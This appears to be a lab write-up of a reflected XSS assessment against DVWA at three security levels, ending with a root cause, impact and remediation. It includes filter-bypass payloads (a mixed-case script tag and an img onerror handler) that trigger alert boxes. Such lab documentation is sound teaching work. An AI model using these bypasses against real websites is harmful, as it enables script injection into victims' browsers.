# Reflected Cross-Site Scripting (Reflected XSS)

## Overview

Reflected Cross-Site Scripting (XSS) occurs when user-controlled input is immediately reflected in the application's response without proper output encoding. An attacker can execute arbitrary JavaScript in a victim's browser.

---

## Security Level Comparison

| Feature | Low | Medium | High |
|---------|------|---------|------|
| Protection | No filtering | Case-sensitive `<script>` filter | Pattern-based `<script>` filter |
| Successful Payload | `<script>` | `<ScRiPt>` | `<img onerror>` |
| Exploitation Difficulty | Easy | Moderate | Moderate |

---

# Low Security Level

## Reconnaissance

| Activity | Finding |
|----------|---------|
| Parameter Analysis | User-controlled `name` parameter identified. |
| Request Analysis | Input is submitted through the GET request. |
| Response Analysis | User input is reflected directly in the response. |

---

## Validation

| Test | Payload | Observation |
|------|---------|-------------|
| Reflection Test | `Tanya` | Input reflected successfully. |
| HTML Test | `<b>Hello</b>` | HTML rendered by the browser. |
| JavaScript Test | `<script>alert(document.domain)</script>` | JavaScript executed successfully. |

### Observation

The application performs no input validation or output encoding, allowing arbitrary JavaScript execution.

---

## Evidence

### Screenshot 1 — XSS Payload

```html
<script>alert(document.domain)</script>
```

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Reflected_xss/01_low_input.png" width="100%">
</p>

---

### Screenshot 2 — JavaScript Executed

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Reflected_xss/02_low_payload(xss).png" width="100%">
</p>

---

# Medium Security Level

## Validation

| Test | Payload | Observation |
|------|---------|-------------|
| Reflection Test | `Tanya` | Input reflected successfully. |
| HTML Test | `<b>Hello</b>` | HTML rendered successfully. |
| Script Test | `<script>alert(document.domain)</script>` | Script tag filtered. |

### Observation

The filter blocks only the lowercase `<script>` tag, indicating a case-sensitive blacklist.

---

## Exploitation

| Payload | Purpose | Result |
|---------|---------|--------|
| `<ScRiPt>alert(document.domain)</ScRiPt>` | Bypass case-sensitive filter | JavaScript executed successfully. |

---

## Evidence

### Screenshot 1 — Filtered Payload

```html
<script>alert(document.domain)</script>
```

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Reflected_xss/03_medium_payload.png" width="100%">
</p>

---

### Screenshot 2 — Filter Bypass

```html
<ScRiPt>alert(document.domain)</ScRiPt>
```

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Reflected_xss/04_medium_result.png" width="100%">
</p>

---

# High Security Level


## Validation

| Test | Payload | Observation |
|------|---------|-------------|
| Reflection Test | `Tanya` | Input reflected successfully. |
| HTML Test | `<b>Hello</b>` | HTML rendered successfully. |
| Script Test | `<script>alert(document.domain)</script>` | Script tag blocked. |

### Observation

The application blocks `<script>` tags but does not sanitize HTML event attributes.

---

## Exploitation

| Payload | Purpose | Result |
|---------|---------|--------|
| `<img src=x onerror=alert(document.domain)>` | Execute JavaScript using an HTML event | JavaScript executed successfully. |

---

## Evidence

### Screenshot 1 — Blocked `<script>` Payload

```html
<script>alert(document.domain)</script>
```

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Reflected_xss/05_high_payload.png" width="100%">
</p>

---

### Screenshot 2 — Event Handler Bypass

```html
<img src=x onerror=alert(document.domain)>
```

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Reflected_xss/06_high_result.png" width="100%">
</p>

---

# Root Cause

The application reflects user-controlled input without applying context-aware output encoding. Blacklist-based filtering is insufficient because attackers can bypass filters using alternative syntax or HTML event handlers.

---

# Overall Impact

- Execute arbitrary JavaScript in a victim's browser.
- Steal sensitive information such as session identifiers (when protections like `HttpOnly` are absent).
- Modify webpage content.
- Redirect users to malicious websites.
- Perform actions on behalf of authenticated users.

---

# Remediation

- Apply context-aware output encoding before rendering user input.
- Validate and sanitize user input on the server side.
- Avoid blacklist-based filtering; use allowlists where appropriate.
- Implement a strong Content Security Policy (CSP).
- Use `HttpOnly` and `Secure` attributes for session cookies.
- Perform regular security testing to identify XSS vulnerabilities.
